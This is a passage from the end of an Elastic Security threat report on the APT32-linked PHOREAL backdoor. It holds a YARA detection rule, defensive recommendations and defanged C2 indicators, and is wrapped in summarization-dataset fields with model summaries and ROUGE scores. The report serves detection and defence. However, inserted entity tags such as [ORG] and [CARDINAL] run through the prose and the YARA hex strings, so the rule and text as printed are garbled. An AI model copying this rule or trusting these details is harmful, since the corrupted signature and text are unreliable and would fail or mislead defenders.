has been active since [DATE] 2014 notably targeting6/8Southeast [NORP] Asian governments and businesses or other international businesses with interests in [GPE] Vietnam . APT32 is the only group currently identified as operating the [ORG] PHOREAL backdoor , and our victim matches the geographic and industry vertical profile of typical and specific prior APT32 victims . Conclusion\u00b6 [ORG] YARA Rules\u00b6We have created a [ORG] YARA rule to identify this [ORG] PHOREAL activity . [PERSON] Yara rule to detect [ORG] REF4322 / APT32 in - memory backdoor [ORG] PHOREAL / Rizzo.rule Windows_Trojan_PHOREAL { meta : Author = \" [WORK_OF_ART] Elastic [WORK_OF_ART] Security \" creation_date = \" [DATE] 2022 - 02 - 16 \" last_modified = \" [DATE] 2022 - 02 - 16 \" threat_name = \" [WORK_OF_ART] Windows . Trojan . PHOREAL \" description = \" [WORK_OF_ART] Detects [WORK_OF_ART] REF4322 / APT32 [WORK_OF_ART] in - memory backdoor [ORG] PHOREAL / [PERSON] Rizzo . \" \\\\ \" \\\\.\\pipe\\{A06F176F-79F1 - 473E - AF44 - 9763E3CB34E5 } \" ascii wide $ [MONEY] a1 = { [DATE] 5C [DATE] 00 5C 00 [CARDINAL] 2E 00 5C 00 70 00 69 00 70 00 65 00 5C 00 7B 00 41 00 30 00 36 00 46 00 31 00 37 00 36 00 46 00 [CARDINAL] 2D 00 37 00 39 00 46 00 31 00 [CARDINAL] 2D 00 34 00 37 00 33 00 45 00 2D 00 [CARDINAL] 41 00 46 00 [CARDINAL] 34 00 [CARDINAL] 34 00 [CARDINAL] 2D 00 39 00 37 00 36 00 33 00 45 00 33 00 43 00 42 00 33 00 34 00 45 00 35 00 7D 00 } \\\\ \" Local\\{5FBC3F53 - A76D-4248 - 969A-31740CBC8AD6 } \" ascii wide $ [MONEY] a2 = { [CARDINAL] 4C 00 [CARDINAL] 6F 00 63 00 61 00 6C 00 5C 00 7B 00 35 00 46 00 42 00 43 00 33 00 46 00 35 00 33 00 [CARDINAL] 2D 00 [CARDINAL] 41 00 37 00 36 00 44 00 [CARDINAL] 2D 00 34 00 [CARDINAL] 32 00 [CARDINAL] 34 00 38 00 [CARDINAL] 2D 00 39 00 36 00 39 00 [CARDINAL] 41 00 2D 00 33 00 31 00 37 00 34 00 30 00 43 00 42 00 43 00 38 00 [CARDINAL] 41 00 44 00 36 00 7D 00 } \\\\ \" { FD5F8447 - 657A-45C1 - 894B - D533926C9B66}.dll \" ascii $ a3 = { [CARDINAL] 7B 46 44 [CARDINAL] 35 46 38 34 [CARDINAL] 34 37 [CARDINAL] 2D 36 35 37 [CARDINAL] 41 [CARDINAL] 2D 34 35 43 31 [CARDINAL] 2D 38 39 34 42 2D 44 35 33 33 39 32 36 43 39 42 36 36 7D 2E 64 6C [CARDINAL] 6C } \\\\ PHOREAL start_address_bytes sequence $ str_addr = { 8B FF [CARDINAL] 55 [CARDINAL] 8B [ORG] EC [CARDINAL] 56 [PRODUCT] E8 [PRODUCT] 3F 3E 00 00 [PRODUCT] E8 [PRODUCT] 34 3E 00 00 50 [PRODUCT] E8 [PRODUCT] 14 3E 00 00 [CARDINAL] 85 C0 75 [CARDINAL] 2A 8B 75 08 56 [PRODUCT] E8 [PRODUCT] 21 } condition : [CARDINAL] 2 of them } Defensive Recommendations\u00b6The following steps can be leveraged to improve a network \u2019s protective posture:1 . [ORG] Enable [ORG] Elastic [ORG] Security [ORG] Memory [ORG] Protection [ORG] on [ORG] Windows endpoints 2 . Leverage the included [ORG] YARA signatures above to determine if PHOREAL activity exists within your organization [CARDINAL] 3 . Monitor or block network traffic to or from identified network IOCs and remediate impacted systems accordingly . References\u00b6The following research was referenced throughout the document : Observables\u00b6Indicator thelivemusicgroup[.]com103.75.117[.]250Type addrReference NotesC2 domain encrypted in malware Resolved IP of thelivemusicgroup[.]com7/8Indicator Created : [DATE] March 7 , [DATE] 2022 \u00a9 [DATE] 2022 . [ORG] Elasticsearch [ORG] B.V. All Rights Reserved8/8", "generated_text": "the PHOREAL/RIZZO backdoor; use; APT32; Vietnam; political interests; the threat; analysis; shellcode_thread Windows memory protection alerts; an Elastic Agent; endpoint sensor; Control Panel; shellcode_thread protection; the control.exe process; the alerts; a Microsoft signed target process; the malware; detection; detection; detection; mitigation; the campaign.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF describes an investigation by Elastic Security into a malware campaign targeting the financial sector in Vietnam. The malware is called PHOREAL/RIZZO, which is a backdoor that allows attackers to gain initial access and conduct further exploitation of victim networks. Elastic detected anomalous activity on a Windows endpoint, where the control.exe process was loading an unsigned DLL called tscon32.dll. Further analysis showed this DLL contained the PHOREAL malware, which has been attributed to the threat actor group APT32 (also known as OceanLotus). APT32 has been active since 2014, targeting organizations in Southeast Asia, particularly Vietnam. PHOREAL appears to be used early in an intrusion to establish a foothold in the victim network. The malware contains an encrypted C2 domain which resolves to an IP address hosted by a company in Hong Kong. Elastic developed YARA rules to detect PHOREAL and enable collection of the malicious threads from memory. Recommendations include enabling memory protection capabilities in Elastic Agents, deploying the YARA rules, and blocking identified IOCs. In summary, this documents an incident where the PHOREAL backdoor linked to APT32 was detected being loaded into the control.exe process on a system in the Vietnamese financial sector. Analysis by Elastic Security provides technical details on the malware and recommendations for detection and response. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4261363636363636, "gpt3/lexical/rouge_rouge2": 0.10857142857142855, "gpt3/lexical/rouge_rougeL": 0.19886363636363635, "gpt3/lexical/rouge_rougeLsum": 0.19886363636363635, "gpt3_generated_text": ["The article discusses the ongoing campaign targeting a Vietnamese financial services institution with the PHOREAL/RIZZO backdoor, believed to be used exclusively by APT32. This malware allows for initial victim characterization and post-exploitation operations, mainly targeting victims with political or economic interests in Southeast Asia, specifically Vietnam. Elastic Security has identified this threat and provided guidance on how to triage threat alerts, extract observables for detection and mitigation, and produce a new malware signature. The investigation details the discovery of shellcode_thread Windows memory protection alerts targeting the control.exe process, which raised suspicion due to its atypical characteristics. Further analysis revealed the presence of an unsigned loaded.dll, leading to a focus on this module for threat detection and mitigation in the ongoing campaign."]}]